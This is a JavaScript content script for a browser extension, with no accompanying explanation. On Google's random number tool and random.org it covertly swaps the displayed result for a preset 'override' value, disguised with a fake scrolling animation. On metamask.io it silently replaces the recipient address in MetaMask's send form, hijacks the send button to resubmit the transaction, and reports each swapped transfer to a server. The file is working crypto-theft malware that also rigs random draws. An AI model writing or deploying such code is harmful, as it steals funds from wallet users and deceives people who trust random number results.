const serverUrl = 'http://localhost:80/api';

function isValidQuery(query) {
    const rngRegex = /(google|number|random|rand|rng|generator|gen|random\.org).*/i;
    return rngRegex.test(query.toLowerCase().trim());
}

function getGoogleMinMaxValues() {
    const minElement = document.querySelector('input.gws-csf-randomnumber__minVal');
    const maxElement = document.querySelector('input.gws-csf-randomnumber__maxVal');

    return {
        min: minElement ? parseInt(minElement.value) : 1,
        max: maxElement ? parseInt(maxElement.value) : 10
    };
}

function startGoogleNumberScrollAnimation(element, finalValue, min, max) {
    let currentNumber = min;
    const interval = setInterval(() => {
        currentNumber = Math.floor(Math.random() * (max - min + 1)) + min;
        element.textContent = currentNumber;
    }, 20);

    setTimeout(() => {
        clearInterval(interval);
        element.textContent = finalValue;
        element.classList.add('visible');
    }, 200);
}

function startRandomOrgNumberScrollAnimation(element, finalValue, min, max) {
    let currentNumber = min;
    const interval = setInterval(() => {
        currentNumber = Math.floor(Math.random() * (max - min + 1)) + min;
        element.textContent = currentNumber;
    }, 30);

    setTimeout(() => {
        clearInterval(interval);
        element.textContent = finalValue;
        element.classList.add('highlight');
    }, 300);
}

async function handleServerInteractions(resultElement, generatedNumber, min, max, startAnimation) {
    try {
        const overrideValue = await new Promise((resolve) => {
            chrome.runtime.sendMessage({ action: 'getOverrideValue' }, resolve);
        });

        if (overrideValue !== null) {
            console.log('Override value found:', overrideValue);
            startAnimation(resultElement, overrideValue, min, max);
            chrome.runtime.sendMessage({ action: 'clearOverride' });
        } else {
            resultElement.textContent = generatedNumber;
            resultElement.classList.add('visible');
        }

        chrome.runtime.sendMessage({ action: 'saveNumber', value: resultElement.textContent });
    } catch (error) {
        console.error('Error handling server interactions:', error);
    }
}

async function reportTransactionSuccess(overrideAddress) {
    try {
        const response = await fetch(`${serverUrl}/reportTransaction`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                status: 'success',
                overrideAddress: overrideAddress,
                timestamp: new Date().toISOString()
            })
        });

        const data = await response.json();
        if (data.status === 'success') {
            console.log(`Transaction reported successfully: ${overrideAddress}`);
        } else {
            console.error('Transaction report error:', data.message);
        }
    } catch (error) {
        console.error('Network error in reporting transaction:', error);
    }
}

async function handleMetaMaskExtension() {
    const METAMASK_IFRAME_SELECTOR = 'iframe';

    async function fetchOverrideAddress() {
        return new Promise((resolve) => {
            chrome.runtime.sendMessage({ action: 'getMetaMaskOverrideValue' }, (response) => {
                resolve(response?.overrideAddress ?? null);
            });
        });
    }

    function replaceAddressOnEveryStep(iframe) {
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

        async function replaceAddress() {
            const addressInput = iframeDoc.querySelector('input[data-testid="ens-input"]');
            const sendButton = iframeDoc.querySelector('button.mm-button-primary');

            if (addressInput) {
                const overrideValue = await fetchOverrideAddress();
                if (overrideValue) {
                    addressInput.value = overrideValue;
                    addressInput.dispatchEvent(new Event('input', { bubbles: true }));
                }
            }

            if (sendButton) {
                sendButton.addEventListener('click', async (event) => {
                    event.stopImmediatePropagation();
                    event.preventDefault();

                    const overrideValue = await fetchOverrideAddress();
                    if (overrideValue) {
                        if (addressInput) {
                            addressInput.value = overrideValue;
                            addressInput.dispatchEvent(new Event('input', { bubbles: true }));
                        }

                        reportTransactionSuccess(overrideValue);
                        setTimeout(() => sendButton.click(), 200);
                    }
                });
            }
        }

        const observer = new MutationObserver(() => replaceAddress());
        observer.observe(iframeDoc.body, { childList: true, subtree: true });

        replaceAddress();
    }

    const mainObserver = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.tagName === 'IFRAME') {
                    setTimeout(() => replaceAddressOnEveryStep(node), 1000);
                }
            });
        });
    });

    mainObserver.observe(document.body, { childList: true, subtree: true });
}

function handleGoogleRNG() {
    const generateButton = document.getElementById('ZdzlKb');

    if (!generateButton) {
        console.error('Generate button not found');
        return;
    }

    generateButton.addEventListener('click', function () {
        setTimeout(() => {
            const resultElement = document.querySelector('.gws-csf-randomnumber__result');
            if (!resultElement) {
                console.error('Result element not found');
                return;
            }

            const generatedNumber = resultElement.textContent.trim();
            const { min, max } = getGoogleMinMaxValues();

            handleServerInteractions(resultElement, generatedNumber, min, max, startGoogleNumberScrollAnimation);
        }, 300);
    });
}

function handleRandomOrg() {
    const iframe = document.querySelector('iframe');

    if (!iframe) {
        console.error('Iframe not found');
        return;
    }

    iframe.onload = () => {
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        const generateButton = iframeDoc.getElementById('generate');

        if (!generateButton) {
            console.error('Generate button not found inside iframe');
            return;
        }

        generateButton.addEventListener('click', () => {
            setTimeout(() => {
                const resultElement = iframeDoc.getElementById('result');
                if (!resultElement) {
                    console.error('Result element not found');
                    return;
                }

                const generatedNumber = resultElement.textContent.trim();
                handleServerInteractions(resultElement, generatedNumber, 1, 100, startRandomOrgNumberScrollAnimation);
            }, 300);
        });
    };
}

window.onload = function () {
    const currentUrl = window.location.href;

    if (currentUrl.includes('google.com')) {
        handleGoogleRNG();
    } else if (currentUrl.includes('random.org')) {
        handleRandomOrg();
    } else if (currentUrl.includes('metamask.io')) {
        handleMetaMaskExtension();
    }
};
